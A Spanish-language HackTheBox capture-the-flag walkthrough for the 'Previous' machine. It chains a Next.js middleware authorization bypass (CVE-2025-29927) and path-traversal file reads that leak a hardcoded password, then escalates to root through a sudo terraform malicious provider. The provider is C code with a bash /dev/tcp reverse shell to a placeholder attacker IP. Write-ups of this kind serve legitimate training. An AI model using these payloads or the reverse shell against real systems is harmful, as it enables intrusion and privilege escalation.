---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Previous HackTheBox (Intermediate)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 09:38 EDT
Nmap scan report for 10.10.11.83
Host is up (0.035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://previous.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.06 seconds
```

Veremos que hay varios puertos, pero nos centraremos en el puerto `80`, vemos de ante mano que nos redirige a un `dominio` llamado `previous.htb`, por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>             previous.htb
```

Lo guardamos y entraremos por dicho `dominio` de esta forma:

```
URL = http://previous.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-24 154803.png" alt=""><figcaption></figcaption></figure>

Veremos una pagina web normal, sin nada interesante, pero si bajamos abajo del todo, veremos que hay un `contacto`, que si investigamos a donde redirige, veremos lo siguiente:

```html
<a href="mailto:jeremy@previous.htb" class="text-gray-500 hover:text-gray-900">Contact</a>
```

Vemos que ya tenemos un contacto llamado `jeremy`, despues de un rato buscando me funciono un pequeño `NoSQLi`, pero nada interesante, si utilzamos una extension llamada `Wappalyzer` veremos que hay una dependencia en la pagina que se esta utilizando con una version en concreto.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-24 164204.png" alt=""><figcaption></figcaption></figure>

Vemos que hay un `Next.js` con la version `15.2.2`, si buscamos vulnerabilidades de dicha version, veremos que si la hay en concreto con el `CVE-2025-29927 (Next.js) - Authorization Bypass` por lo que vemos se puede realizar un `bypass` del `login` con esta vulnerabilidad.

Investigando un poco encontramos este repositorio donde podemos obtener informacion de como aprovecharla.

URL = [CVE-2025-29927 Exploit PoC](https://github.com/UNICORDev/exploit-CVE-2025-29927/tree/main)

Vamos a preparar nuestro entorno para que funcione.

```shell
git clone https://github.com/UNICORDev/exploit-CVE-2025-29927.git
cd exploit-CVE-2025-29927/
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

Instalado todo, vamos a probarlo de esta forma:

```shell
python3 exploit-CVE-2025-29927.py -u 'http://previous.htb/'
```

Info:

```
        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2025-29927 (Next.js) - Authorization Bypass
TARGETS: http://previous.htb/
PREPARE: Target is running Next.js!
LOADING: Detecting Next.js version with Selenium...
VERSION: Target is running Next.js version 15.2.2 (Vulnerable)

PAYLOAD: {'X-Middleware-Subrequest': 'middleware:middleware:middleware:middleware:middleware'}
EXPLOIT: Payload sent!
FAILURE: Authorization bypass header failed.

PAYLOAD: {'X-Middleware-Subrequest': 'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'}
EXPLOIT: Payload sent!
FAILURE: Authorization bypass header failed.
ERRORED: Exploitation failed! Target may not be vulnerable.
```

Pero veremos que esta fallando y es por que no estamos encontrando la `URL` del parametro especifico que es vulnerable a esta inyeccion.

Si seguimos investigando un poco y probamos en vez de la `URL` normal, la de la `/api` que vemos que esta solicitando todo el rato...

```shell
python3 exploit-CVE-2025-29927.py -u 'http://previous.htb/api'
```

Info:

```
        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2025-29927 (Next.js) - Authorization Bypass
TARGETS: http://previous.htb/api
PREPARE: Target is running Next.js!
LOADING: Detecting Next.js version with Selenium...
VERSION: Target is running Next.js version 15.2.2 (Vulnerable)

PAYLOAD: {'X-Middleware-Subrequest': 'middleware:middleware:middleware:middleware:middleware'}
EXPLOIT: Payload sent!
SUCCESS: Authorization bypass header found!
OUTPUTS: Response written to file: nextjs_bypass_previous.htb.html
REQUEST: curl -i -k "http://previous.htb/api" -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
```

Veremos que funciona, por lo que vamos a probar varios parametros de `endpoint` de la `API` a ver cual puede existir ya que estamos `bypasseando` el `login`.

> urlBypass.sh

```bash
# Script para probar múltiples endpoints
ENDPOINTS=("users" "admin" "config" "settings" "database" "files" "upload" "download" "auth" "session" "tokens" "ssh" "backup")

for endpoint in "${ENDPOINTS[@]}"; do
    echo "Testing: /api/$endpoint"
    curl -s -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" "http://previous.htb/api/$endpoint" | head -20
    echo "---"
done
```

Lo ejecutaremos de esta forma:

```shell
bash urlBypass.sh
```

Info:

```
............................<RESTO DEL CODIGO>.....................................
Testing: /api/download
{"error":"Invalid filename"}
............................<RESTO DEL CODIGO>.....................................
```

Por lo que vemos aqui nos pide un archivo como parametro, por lo que esta funcionando, vamos a probar a realizar lo siguiente:

## FFUF

```shell
ffuf -u 'http://previous.htb/api/download?FUZZ=../../../../../../etc/passwd' -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" -w <WORDLIST>
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://previous.htb/api/download?FUZZ=../../../../../../etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

example                 [Status: 200, Size: 787, Words: 1, Lines: 20, Duration: 569ms]
:: Progress: [20469/20469] :: Job [1/1] :: 331 req/sec :: Duration: [0:01:04] :: Errors: 0 ::
```

Veremos que ha funcionado, hay un parametro llamado `example` que puede leer archivos del sistema, un `LFI`, vamos a verlo con un `curl`.

```shell
curl -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" "http://previous.htb/api/download?example=../../../../../../etc/passwd"
```

Info:

```
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```

Vemos que esta funcionando de forma correcta, por lo que podemos deducir que este servicio esta corriendo con el usuario `node` o bajo algun usuario en alguna carpeta, por lo que vamos a salirnos desde la ruta donde estemos ejecutando ese `download` y hacer un `../` hasta que nos muestre informacion de algun archivo.

## Escalate user jeremy

Si hacemos esto:

```shell
curl -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" "http://previous.htb/api/download?example=../../package.json"
```

Info:

```
{
  "private": true,
  "scripts": {
    "dev": "next dev",
    "build": "next build"
  },
  "dependencies": {
    "@mdx-js/loader": "^3.1.0",
    "@mdx-js/react": "^3.1.0",
    "@next/mdx": "^15.3.0",
    "@tailwindcss/postcss": "^4.1.3",
    "@tailwindcss/typography": "^0.5.16",
    "@types/mdx": "^2.0.13",
    "next": "^15.2.2",
    "next-auth": "^4.24.11",
    "postcss": "^8.5.3",
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "tailwindcss": "^4.1.3"
  },
  "devDependencies": {
    "@types/node": "22.14.0",
    "@types/react": "19.1.0",
    "typescript": "5.8.3"
  }
}
```

Vemos que esta funcionando, si buscamos un poco la estructura de archivos que puede tener este directorio para ir probando archivos veremos algo parecido a esto:

```
/
├── app/                    # Directorio principal (App Router)
│   ├── api/               # Endpoints de API
│   │   └── download/      # Tu endpoint vulnerable
│   │       └── route.js   # route.js | route.ts
│   ├── admin/             # Página de administración
│   │   └── page.js        # page.js | page.tsx
│   ├── globals.css        # Estilos globales
│   └── layout.js          # Layout principal
├── pages/                 # (Legacy - Pages Router)
│   ├── api/              
│   │   └── auth/
│   │       └── [...nextauth].js
│   └── admin.js
├── lib/                   # Utilidades y configuraciones
│   ├── auth.js           # Configuración de NextAuth
│   └── db.js             # Conexión a base de datos
├── components/           # Componentes React
├── public/              # Archivos estáticos
├── .env                 # Variables de entorno
├── .env.local           # Variables locales
├── package.json
└── next.config.js
```

Si probamos con la mayoria de archivos algunos iran y otros no, pero si probamos con `.env` veremos esto:

```shell
curl -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" "http://previous.htb/api/download?example=../../.env"
```

Info:

```
NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a
```

Vemos que es un `hash` en `MD5`, pero no podremos hacer de momento con el nada mas interesante, con ayuda de la `IA` si le pedimos que nos diga una estructura de archivos comunes de `.next` veremos que nos funcionan estos archivos:

```
.next/
├── build-manifest.json                 ✅ FUNCIONA
├── prerender-manifest.json            ✅ FUNCIONA
├── routes-manifest.json               ✅ FUNCIONA
├── static/
│   └── -ipsiOtEey-zESpHzrwmc/
│       ├── _buildManifest.js          ✅ FUNCIONA
│       └── _ssgManifest.js            ✅ FUNCIONA
├── server/
│   ├── pages-manifest.json            ✅ FUNCIONA
│   ├── middleware-manifest.json       ✅ FUNCIONA
│   ├── pages/
│   │   ├── _app.js                    ✅ FUNCIONA
│   │   ├── _error.js                  ✅ FUNCIONA  
│   │   ├── api/
│   │   │   ├── auth/
│   │   │   │   └── [...nextauth].js   ✅ FUNCIONA
│   │   │   └── download.js            ✅ FUNCIONA
│   │   ├── index.html                 ✅ (pero es HTML estático)
│   │   ├── signin.html                ✅ (pero es HTML estático)
│   │   └── docs/
│   │       ├── [section].html         ✅ (pero es HTML estático)
│   │       └── *.html                 ✅ (otros HTML estáticos)
```

Si las probamos la mas importante que podemos ver es esta:

```shell
curl -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" "http://previous.htb/api/download?example=../../.next/prerender-manifest.json"
```

Info:

```
{
  "version": 4,
  "routes": {},
  "dynamicRoutes": {},
  "preview": {
    "previewModeId": "491840debc08d71affc165ef8084f2c8",
    "previewModeSigningKey": "6688caac8986183042394d23aa9565fb674a38a3613d45b2fbabe6542f28c87f",
    "previewModeEncryptionKey": "ea19262bf8a3caf7618bd617a1352695609534438b49ae035b2ee0b84024490c"
  },
  "notFoundRoutes": []
}
```

```shell
curl -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" "http://previous.htb/api/download?example=../../.next/server/pages-manifest.json"
```

Info:

```
{
  "/_app": "pages/_app.js",
  "/_error": "pages/_error.js",
  "/api/auth/[...nextauth]": "pages/api/auth/[...nextauth].js",
  "/api/download": "pages/api/download.js",
  "/docs/[section]": "pages/docs/[section].html",
  "/docs/components/layout": "pages/docs/components/layout.html",
  "/docs/components/sidebar": "pages/docs/components/sidebar.html",
  "/docs/content/examples": "pages/docs/content/examples.html",
  "/docs/content/getting-started": "pages/docs/content/getting-started.html",
  "/docs": "pages/docs.html",
  "/": "pages/index.html",
  "/signin": "pages/signin.html",
  "/_document": "pages/_document.js",
  "/404": "pages/404.html"
}
```

Sabiendo esto podremos analizar la siguiente ruta bastante interesante:

```shell
curl -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" 'http://previous.htb/api/download?example=../../.next/server/pages/api/auth/\[...nextauth\].js'
```

Info:

```
"use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();
```

Veremos que nos esta mostrando un usuario y contraseña, por lo que vamos a probarlas por `SSH` a ver si funciona.

### SSH

```shell
ssh jeremy@<IP>
```

Metemos como contraseña `MyNameIsJeremyAndILovePancakes`...

```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Sep 24 04:22:28 PM UTC 2025

  System load:  0.01              Processes:             214
  Usage of /:   79.8% of 8.76GB   Users logged in:       0
  Memory usage: 9%                IPv4 address for eth0: 10.10.11.83
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Sep 24 16:22:28 2025 from 10.10.14.98
jeremy@previous:~$ whoami
jeremy
```

Con esto veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
c96ca7a03235e8ab57e07d372359bba0
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

Veremos que podemos ejecutar el binario `terraform` junto con sus parametro como el usuario `root`, por lo que vamos analizar que hacer dicho binario.

Si investigamos un poco veremos que hay una vulnerabilidad en la que podremos crear un provider malicioso que ejecuta reverse shell, para ello tendremos que crearlo y compilarlo de esta forma:

```shell
cat > /tmp/malprov/malicious.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
    system("bash -c 'bash -i >& /dev/tcp/<IP_ATTACKER>/<PORT> 0>&1'");
    
    printf("Malicious provider executed as UID: %d\n", getuid());
    return 0;
}
EOF
```

Ahora lo compilaremos.

```shell
gcc -o /tmp/malprov/terraform-provider-examples_v1.0.0 /tmp/malprov/malicious.c
```

Vamos a configurar el `dev_overrides` para usar nuestro provider.

```shell
cat > /home/jeremy/.terraformrc << 'EOF'
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/tmp/malprov"
  }
  direct {}
}
EOF
```

Ahora nos pondremos a la escucha desde la maquina atacante:

```shell
nc -lvnp <PORT>
```

Si ejecutamos el comando estando a la escucha y configurandolo con la variable de entorno...

```shell
TF_CLI_CONFIG_FILE=/home/jeremy/.terraformrc \
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Info:

```
╷
│ Warning: Provider development overrides are in effect
│ 
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /tmp/malprov
│ 
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become incompatible with published
│ releases.
╵
```

Ahora si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.98] from (UNKNOWN) [10.10.11.83] 56516
root@previous:/opt/examples# whoami
whoami
root
```

Veremos que ha funcionado y seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
af8a8e83da09a0f824ba7e665db4be51
```
